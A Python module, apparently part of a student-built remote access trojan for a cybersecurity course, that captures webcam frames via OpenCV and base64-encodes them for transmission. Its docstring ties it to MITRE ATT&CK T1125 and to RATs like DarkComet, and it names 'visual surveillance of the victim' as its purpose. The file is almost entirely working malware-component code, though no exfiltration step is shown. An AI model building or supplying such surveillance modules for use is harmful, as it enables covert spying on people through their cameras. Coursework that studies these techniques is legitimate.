"""
Webcam Capture Module
MITRE ATT&CK: T1125 (Video Capture)
EDUCATIONAL PURPOSE ONLY - RMIT Cybersecurity Assignment

Captures images from the system webcam using OpenCV.
This is a common capability in commercial RATs (DarkComet, njRAT, Quasar).

Why this matters:
  - Webcam access = visual surveillance of the victim
  - Can capture sensitive environments (offices, homes)
  - Combined with screenshots, gives full situational awareness
  - Many users have webcam indicator lights disabled or covered

Dependencies: opencv-python (cv2), Pillow (PIL)
"""

import base64
import io
from datetime import datetime

try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False


def capture_webcam(camera_index=0, quality=80):
    """
    Capture a single frame from the webcam.

    Args:
        camera_index: Camera device index (0 = default webcam)
        quality: JPEG quality (1-100)

    Returns:
        dict with image data, or None if capture fails

    MITRE ATT&CK: T1125 - Video Capture
    """
    if not HAS_CV2:
        return None, "opencv-python not installed"

    try:
        # Open camera
        cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)  # CAP_DSHOW for Windows

        if not cap.isOpened():
            return None, "Could not open webcam"

        # Allow camera to warm up
        cap.read()  # Discard first frame (often black)

        # Capture frame
        ret, frame = cap.read()
        cap.release()

        if not ret or frame is None:
            return None, "Failed to capture frame"

        # Get frame dimensions
        height, width = frame.shape[:2]

        # Encode to JPEG
        encode_params = [cv2.IMWRITE_JPEG_QUALITY, quality]
        _, buffer = cv2.imencode('.jpg', frame, encode_params)
        img_bytes = buffer.tobytes()

        # Base64 encode for transmission
        img_b64 = base64.b64encode(img_bytes).decode("utf-8")

        return {
            "timestamp": datetime.now().isoformat(),
            "width": width,
            "height": height,
            "size_bytes": len(img_bytes),
            "format": "jpeg",
            "camera_index": camera_index,
            "image_b64": img_b64,
        }, None

    except Exception as e:
        return None, str(e)


def list_cameras(max_check=5):
    """
    Enumerate available camera devices.

    Args:
        max_check: Maximum number of camera indices to probe

    Returns:
        list of available camera indices
    """
    if not HAS_CV2:
        return []

    available = []
    for i in range(max_check):
        try:
            cap = cv2.VideoCapture(i, cv2.CAP_DSHOW)
            if cap.isOpened():
                ret, _ = cap.read()
                if ret:
                    available.append(i)
                cap.release()
        except Exception:
            continue

    return available


def get_camera_info(camera_index=0):
    """
    Get camera properties (resolution, FPS).

    Returns:
        dict with camera properties, or None
    """
    if not HAS_CV2:
        return None

    try:
        cap = cv2.VideoCapture(camera_index, cv2.CAP_DSHOW)
        if not cap.isOpened():
            return None

        info = {
            "camera_index": camera_index,
            "width": int(cap.get(cv2.CAP_PROP_FRAME_WIDTH)),
            "height": int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT)),
            "fps": cap.get(cv2.CAP_PROP_FPS),
            "backend": cap.getBackendName(),
        }
        cap.release()
        return info

    except Exception:
        return None


if __name__ == "__main__":
    print("=" * 50)
    print("  Webcam Capture Module Test")
    print("  MITRE ATT&CK: T1125 - Video Capture")
    print("=" * 50)

    if not HAS_CV2:
        print("\n[!] opencv-python not installed")
        print("    Install: pip install opencv-python")
    else:
        cameras = list_cameras()
        print(f"\n[*] Available cameras: {cameras}")

        if cameras:
            info = get_camera_info(cameras[0])
            print(f"[*] Camera info: {info}")

            data, err = capture_webcam(cameras[0])
            if data:
                print(f"[+] Captured: {data['width']}x{data['height']}, {data['size_bytes']} bytes")
            else:
                print(f"[-] Capture failed: {err}")
        else:
            print("[-] No cameras found")
